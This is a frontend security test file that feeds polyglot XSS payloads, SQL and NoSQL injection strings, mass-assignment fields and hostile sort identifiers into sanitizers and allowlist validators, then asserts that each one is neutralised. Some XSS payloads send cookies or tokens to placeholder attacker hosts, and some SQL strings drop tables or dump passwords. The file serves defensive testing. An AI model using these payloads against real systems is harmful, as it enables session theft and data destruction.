// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import createDOMPurify from 'dompurify';
import { ContextAwareEscaper } from '../security/escapingEngine';
import {
  SecurityValidationEngine,
  VALIDATION_PATTERNS,
} from '../security/validationEngine';

const DOMPurify = typeof window !== 'undefined' ? createDOMPurify(window) : createDOMPurify();

// Polyglot XSS Vectors & Payloads
const POLYGLOT_XSS_PAYLOADS = [
  "javascript:/*--</title></style></textarea></script>--><svg/onload=alert('XSS')>",
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:void(0)" onclick="evil()">Click me</a>',
  '"><script src=//attacker.com/hook.js></script>',
  '"><img src=x onerror=fetch("https://attacker.site/leak?data="+localStorage.getItem("token"))>',
];

// SQL Injection Vectors
const SQLI_FUZZ_VECTORS = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "1; WAITFOR DELAY '0:0:5'",
  "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --",
  "'; DROP TABLE orders; --",
  "' UNION SELECT null, username, password FROM users --",
  "admin'--",
  "1' ORDER BY 1,2,3,4,5,6,7,8,9,10--",
  "1 AND 1=2 UNION ALL SELECT 1, 'admin', 'password'--",
  "BENCHMARK(5000000,MD5(0x41414141))",
  "'; SELECT pg_sleep(5); --",
];

// NoSQL Operator Objects
const NOSQL_OPERATOR_VECTORS = [
  { $gt: '' },
  { $regex: '.*' },
  { $where: 'this.password.length > 0' },
  { $ne: null },
  { $in: ['admin', 'superadmin'] },
];

describe('Phase 5: Automated Injection Regression & Penetration Fuzzing Suite (Frontend)', () => {
  // ─── SEC-INJ-01: SQL Injection Vectors in Search & Query Encoders ─────────
  describe('SEC-INJ-01: SQL Injection & Query Punctuation Neutralization', () => {
    SQLI_FUZZ_VECTORS.forEach((vector, idx) => {
      it(`[SQLi-Fuzz #${idx + 1}] should safely encode SQLi vector "${vector}" into safe URI component without command breakdown`, () => {
        const encoded = encodeURIComponent(vector);
        // Verify out-of-band transmission encoding
        expect(encoded).not.toContain(' ');
        expect(decodeURIComponent(encoded)).toBe(vector);

        // Sanitize for alphanumeric contexts: strips quotes, semicolons, brackets
        const sanitized = SecurityValidationEngine.sanitizeAlphanumeric(vector);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });
  });

  // ─── SEC-INJ-02: Polyglot XSS Vectors & DOMPurify Neutralization ────────────
  describe('SEC-INJ-02: Polyglot XSS Attacks & DOMPurify Neutralization', () => {
    POLYGLOT_XSS_PAYLOADS.forEach((payload, idx) => {
      it(`[XSS-Fuzz #${idx + 1}] should completely disarm and neutralize polyglot payload #${idx + 1}`, () => {
        // 1. Context escaping check
        const escaped = ContextAwareEscaper.escapeHtmlBody(payload);
        expect(escaped).not.toContain('<script>');
        expect(escaped).not.toContain('</script>');
        expect(escaped).not.toContain('<svg');
        expect(escaped).not.toContain('<img');

        // 2. DOMPurify check: all executable elements and event handlers removed
        const sanitized = DOMPurify.sanitize(payload, {
          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'span'],
          ALLOWED_ATTR: ['href', 'target', 'rel'],
        });

        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
      });
    });

    it('should neutralize javascript: and data: pseudo-protocols via sanitizeUrl', () => {
      expect(ContextAwareEscaper.sanitizeUrl('javascript:alert(1)')).toBe('about:blank');
      expect(ContextAwareEscaper.sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('about:blank');
      expect(ContextAwareEscaper.sanitizeUrl('vbscript:msgbox(1)')).toBe('about:blank');
      expect(ContextAwareEscaper.sanitizeUrl('https://erp.eliteedition.in/orders')).toBe('https://erp.eliteedition.in/orders');
    });
  });

  // ─── SEC-INJ-03: NoSQL Operator & Type Confusion Neutralization ───────────
  describe('SEC-INJ-03: NoSQL Operator & Object Injection Neutralization', () => {
    NOSQL_OPERATOR_VECTORS.forEach((vector, idx) => {
      const opKey = Object.keys(vector)[0];
      it(`[NoSQL-Fuzz #${idx + 1}] should reject or string-neutralize operator object "${opKey}"`, () => {
        // When serialized, ensure operators cannot break out of JSON
        const serialized = ContextAwareEscaper.safeJsonSerialize(vector);
        expect(serialized).not.toContain('</script>');

        // Numeric sanitizer should reject or return empty when given non-string/object
        expect(SecurityValidationEngine.sanitizeNumeric(vector)).toBe('');
      });
    });
  });

  // ─── SEC-INJ-04: Mass Assignment Defense & Field Allowlisting ─────────────
  describe('SEC-INJ-04: Mass Assignment Defense & Payload Allowlisting', () => {
    it('should strip undeclared privilege elevation fields from form payloads', () => {
      const rawFormInput = {
        name: 'Valid Customer',
        phone: '9876543210',
        isAdmin: true,
        role: 'superadmin',
        balance: 999999,
        permissions: ['*'],
      };

      // Client whitelist mapper
      const ALLOWED_FIELDS = ['name', 'phone', 'address', 'city'];
      const filteredPayload = Object.keys(rawFormInput)
        .filter((key) => ALLOWED_FIELDS.includes(key))
        .reduce((obj, key) => {
          obj[key] = rawFormInput[key];
          return obj;
        }, {});

      expect(filteredPayload).toEqual({
        name: 'Valid Customer',
        phone: '9876543210',
      });
      expect(filteredPayload).not.toHaveProperty('isAdmin');
      expect(filteredPayload).not.toHaveProperty('role');
      expect(filteredPayload).not.toHaveProperty('balance');
      expect(filteredPayload).not.toHaveProperty('permissions');
    });
  });

  // ─── SEC-INJ-05: Dynamic Identifier Injection Neutralization ──────────────
  describe('SEC-INJ-05: Dynamic Identifier & Sort Query Allowlisting', () => {
    const ALLOWED_SORT_COLUMNS = ['createdAt', 'updatedAt', 'name', 'status', 'totalAmount'];

    function validateSortField(sortBy) {
      if (!ALLOWED_SORT_COLUMNS.includes(sortBy)) {
        throw new Error(`Invalid sortBy identifier: ${sortBy}`);
      }
      return sortBy;
    }

    const DANGEROUS_SORT_INPUTS = [
      'id;DROP TABLE users;',
      'users.password',
      'sleep(5)',
      '1,2,3',
      'status; DELETE FROM orders;',
      '{"$gt": ""}',
      '<script>alert(1)</script>',
      'name DESC; --',
    ];

    DANGEROUS_SORT_INPUTS.forEach((sortInput, idx) => {
      it(`[Identifier-Fuzz #${idx + 1}] should reject dangerous identifier "${sortInput}" via allowlist validation`, () => {
        expect(() => validateSortField(sortInput)).toThrow('Invalid sortBy identifier');
      });
    });

    it('should accept allowlisted sort identifiers', () => {
      expect(validateSortField('createdAt')).toBe('createdAt');
      expect(validateSortField('name')).toBe('name');
      expect(validateSortField('status')).toBe('status');
    });
  });
});
